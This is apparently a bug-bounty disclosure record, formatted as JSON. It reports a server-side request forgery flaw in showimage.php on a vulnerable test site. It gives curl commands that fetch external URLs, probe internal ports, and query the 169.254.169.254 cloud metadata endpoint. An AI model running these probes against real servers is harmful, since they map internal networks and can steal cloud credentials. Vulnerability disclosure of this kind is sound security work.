{
  "id": 800012,
  "title": "Server-Side Request Forgery (SSRF) via file Parameter in showimage.php on testphp.vulnweb.com",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "visibility": "full",
  "team": {"handle": "acunetix-testphp", "name": "Acunetix Test PHP"},
  "reporter": {"username": "resurface_demo"},
  "weakness": {"id": 918, "name": "Server-Side Request Forgery (SSRF)"},
  "vulnerability_information": "## Summary\nThe `showimage.php` endpoint at `http://testphp.vulnweb.com/showimage.php` accepts a `file` parameter that is used to load and display files. This parameter accepts not only local file paths but also HTTP URLs, enabling Server-Side Request Forgery (SSRF). The server will make HTTP requests to attacker-specified URLs, potentially reaching internal services, cloud metadata endpoints, and other resources not accessible from the internet.\n\n## Steps to Reproduce\n\n### 1. Confirm Local File Access\n```bash\ncurl -s 'http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg' -o /dev/null -w '%{http_code}\\n'\n# Returns 200 — local file is loaded and served\n```\n\n### 2. SSRF via External URL\n```bash\ncurl -s 'http://testphp.vulnweb.com/showimage.php?file=http://example.com' -o /dev/null -w '%{http_code}\\n'\n# Returns 200 — the server fetched the external URL\n```\n\n### 3. Attempt Cloud Metadata Access\n```bash\ncurl -s 'http://testphp.vulnweb.com/showimage.php?file=http://169.254.169.254/latest/meta-data/'\n# If the server is on AWS, this would return instance metadata\n```\n\n### 4. Internal Network Scanning\n```bash\n# Probe internal services\ncurl -s 'http://testphp.vulnweb.com/showimage.php?file=http://127.0.0.1:3306/' -o /dev/null -w '%{http_code}\\n'\ncurl -s 'http://testphp.vulnweb.com/showimage.php?file=http://127.0.0.1:6379/' -o /dev/null -w '%{http_code}\\n'\n```\n\n## Proof of Concept\n```bash\n# Normal image request (baseline)\ncurl -s -o /dev/null -w 'Status: %{http_code}, Size: %{size_download}\\n' \\\n  'http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg'\n# Output: Status: 200, Size: <image_size>\n\n# SSRF: fetch external URL through the server\ncurl -s -o /dev/null -w 'Status: %{http_code}, Size: %{size_download}\\n' \\\n  'http://testphp.vulnweb.com/showimage.php?file=http://example.com'\n# Output: Status: 200, Size: 0 (or content from example.com)\n\n# The server processes the URL, confirming it makes outbound HTTP requests\n# based on user-supplied input in the file parameter\n```\n\nThe fact that the server returns HTTP 200 for both local paths and HTTP URLs confirms that the `file` parameter is used in a function like `file_get_contents()` or `fopen()` with URL wrappers enabled (`allow_url_fopen=On` in PHP).\n\n## Impact\n- **Internal network scanning** — map internal infrastructure by probing various IPs and ports\n- **Cloud metadata theft** — on cloud-hosted instances, access AWS/GCP/Azure metadata endpoints to steal IAM credentials\n- **Bypass firewalls** — reach services only accessible from the server's network\n- **Data exfiltration** — read internal APIs, configuration endpoints, or admin panels\n- **Chained attacks** — combine with other vulnerabilities for remote code execution (e.g., fetch a malicious payload and serve it through the application)",
  "disclosed_at": "2025-08-15T14:00:00.000Z",
  "bounty_amount": "2000.0"
}
